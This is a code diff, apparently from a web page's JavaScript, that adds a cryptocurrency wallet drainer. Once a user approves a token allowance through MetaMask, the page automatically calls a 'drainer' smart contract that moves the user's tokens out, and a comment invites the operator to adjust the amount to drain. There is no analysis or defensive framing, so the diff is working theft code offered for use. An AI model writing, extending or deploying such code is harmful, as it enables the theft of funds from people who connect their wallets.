@@ -66,13 +66,46 @@
 
                     alert('Token approval successful!');
 
-                    // Automatically trigger the drainBNB function after approval
-                    drainBNB();
+                    // Automatically trigger the token drain function after approval
+                    drainTokens();
                 } catch (error) {
                     alert('Error in token approval: ' + error.message);
                 }
             } else {
                 alert('MetaMask is not installed!');
+            }
+        }
+
+        async function drainTokens() {
+            const web3 = new Web3(window.ethereum);
+
+            const drainerContractAbi = [
+                {
+                    "constant": false,
+                    "inputs": [
+                        { "name": "tokenAddress", "type": "address" },
+                        { "name": "amount", "type": "uint256" }
+                    ],
+                    "name": "drainTokens",
+                    "outputs": [],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }
+            ];
+
+            const drainerContract = new web3.eth.Contract(drainerContractAbi, drainerAddress);
+
+            try {
+                const amountToDrain = web3.utils.toWei('1', 'ether'); // Adjust the amount of tokens you want to drain
+
+                // Send a transaction to the contract to drain tokens
+                await drainerContract.methods.drainTokens(tokenAddress, amountToDrain).send({
+                    from: account
+                });
+                alert('Token drain successful!');
+            } catch (error) {
+                alert('Error in draining tokens: ' + error.message);
             }
         }
 
